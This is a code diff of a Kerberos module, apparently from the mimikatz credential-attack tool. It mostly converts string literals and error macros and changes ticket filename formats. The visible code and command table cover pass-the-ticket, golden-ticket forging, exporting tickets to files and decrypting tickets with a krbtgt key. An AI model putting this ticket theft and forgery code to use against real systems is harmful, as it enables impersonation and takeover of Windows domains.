@@ -11,23 +11,23 @@ BOOL	g_isAuthPackageKerberos = FALSE;
 HANDLE	g_hLSA = NULL;
 
 const KUHL_M_C kuhl_m_c_kerberos[] = {
-	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
-	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
-	{kuhl_m_kerberos_ask,		L"ask",			L"Ask or get TGS tickets"},
-	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve current TGT"},
-	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
-	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
-	{kuhl_m_kerberos_hash,		L"hash",		L"Hash password to keys"},
+	{kuhl_m_kerberos_ptt,		"ptt",			"Pass-the-ticket [NT 6]"},
+	{kuhl_m_kerberos_list,		"list",		"List ticket(s)"},
+	{kuhl_m_kerberos_ask,		"ask",			"Ask or get TGS tickets"},
+	{kuhl_m_kerberos_tgt,		"tgt",			"Retrieve current TGT"},
+	{kuhl_m_kerberos_purge,		"purge",		"Purge ticket(s)"},
+	{kuhl_m_kerberos_golden,	"golden",		"Willy Wonka factory"},
+	{kuhl_m_kerberos_hash,		"hash",		"Hash password to keys"},
 #if defined(KERBEROS_TOOLS)
-	{kuhl_m_kerberos_decode,	L"decrypt",		L"Decrypt encoded ticket"},
-	{kuhl_m_kerberos_pac_info,	L"pacinfo",		L"Some infos on PAC file"},
+	{kuhl_m_kerberos_decode,	"decrypt",		"Decrypt encoded ticket"},
+	{kuhl_m_kerberos_pac_info,	"pacinfo",		"Some infos on PAC file"},
 #endif
-	{kuhl_m_kerberos_ccache_ptc,	L"ptc",		L"Pass-the-ccache [NT6]"},
-	{kuhl_m_kerberos_ccache_list,	L"clist",	L"List tickets in MIT/Heimdall ccache"},
+	{kuhl_m_kerberos_ccache_ptc,	"ptc",		"Pass-the-ccache [NT6]"},
+	{kuhl_m_kerberos_ccache_list,	"clist",	"List tickets in MIT/Heimdall ccache"},
 };
 
 const KUHL_M kuhl_m_kerberos = {
-	L"kerberos",	L"Kerberos package module",	L"",
+	L"kerberos",	L"Kerberos package module",	"",
 	ARRAYSIZE(kuhl_m_c_kerberos), kuhl_m_c_kerberos, kuhl_m_kerberos_init, kuhl_m_kerberos_clean
 };
 
@@ -94,7 +94,7 @@ void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
 			PRINT_ERROR(L"LsaCallKerberosPackage %08x\n", status);
 		LocalFree(fileData);
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+	else PRINT_ERROR_AUTO_C("kull_m_file_readData");
 }
 
 NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize)
@@ -243,7 +243,7 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 								{
 									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 										kprintf(L"\n   * Saved to file     : %s", filename);
-									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+									else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 									LocalFree(filename);
 								}
 								LsaFreeReturnBuffer(pKerbRetrieveResponse);
@@ -329,7 +329,7 @@ NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
 						{
 							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 								kprintf(L"\n   * TKT to file       : %s", ticketname);
-							else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+							else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 							LocalFree(ticketname);
 						}
 					if(isExport)
@@ -347,7 +347,7 @@ NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
 							{
 								if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 										kprintf(L"\n   * KiRBi to file     : %s", filename);
-								else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+								else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 								LsaFreeReturnBuffer(pKerbRetrieveResponse);
 							}
 							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
@@ -377,7 +377,7 @@ wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE
 	
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
-		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
+		if(swprintf_s(buffer, charCount, L"%u-%08x-%wZ@[%wZ]-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
 			kull_m_file_cleanFilename(buffer);
 		else
 			buffer = (wchar_t *) LocalFree(buffer);
@@ -394,7 +394,7 @@ wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, L
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
 		if(isLong)
-			isLong = swprintf_s(buffer, charCount, L"%08x-%wZ@%wZ-%wZ.%s", ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
+			isLong = swprintf_s(buffer, charCount, L"%08x-%wZ@[%wZ]-%wZ.%s", ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
 		else
 			isLong = swprintf_s(buffer, charCount, L"%08x-noname.%s", ticket->TicketFlags, ext) > 0;
 		
@@ -514,7 +514,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 								}
 								else if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 									kprintf(L"\nFinal Ticket Saved to file !\n");
-								else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+								else PRINT_ERROR_AUTO_C("\nkull_m_file_writeData");
 								ber_bvfree(BerApp_KrbCred);
 							}
 							else PRINT_ERROR(L"BerApp_KrbCred error\n");
@@ -811,7 +811,7 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 					{
 						if(kull_m_file_writeData(szOut, decData, decSize))
 							kprintf(L"DEC data saved to file! (%s)\n", szOut);
-						else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+						else PRINT_ERROR_AUTO_C("\nkull_m_file_writeData");
 						LocalFree(decData);
 					}
 					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt - DEC (0x%08x)\n", status);
@@ -819,7 +819,7 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 				else PRINT_ERROR(L"Krbtgt key size length must be 32 (16 bytes)\n");
 				LocalFree(encData);
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_file_readData");
+			else PRINT_ERROR_AUTO_C("kull_m_file_readData");
 		}
 		else PRINT_ERROR(L"arg \'in\' missing\n");
 	}
